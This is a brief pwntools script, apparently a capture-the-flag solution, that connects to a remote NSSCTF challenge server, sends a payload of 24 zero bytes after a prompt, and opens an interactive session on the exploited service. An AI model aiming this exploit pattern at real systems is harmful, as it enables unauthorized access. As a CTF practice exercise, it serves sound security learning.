from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./dfv")
io=remote("node4.anna.nssctf.cn",28857)

io.recvuntil(b"?\n")
io.sendline(p64(0)*3)


io.interactive()